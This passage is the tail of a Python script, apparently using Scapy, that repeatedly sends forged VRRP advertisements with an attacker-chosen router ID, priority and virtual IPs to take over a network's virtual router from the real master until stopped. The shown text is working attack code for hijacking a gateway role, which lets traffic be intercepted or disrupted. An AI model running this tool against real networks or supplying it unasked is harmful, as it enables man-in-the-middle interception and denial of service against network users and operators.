                   args.vip)
    print(f"[*] VRRP takeover on {iface}: vrid {args.vrid} prio "
          f"{args.priority} vip(s) {', '.join(args.vip)}")
    try:
        while True:
            sendp(f, iface=iface, verbose=0)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] stopped (real master resumes)")


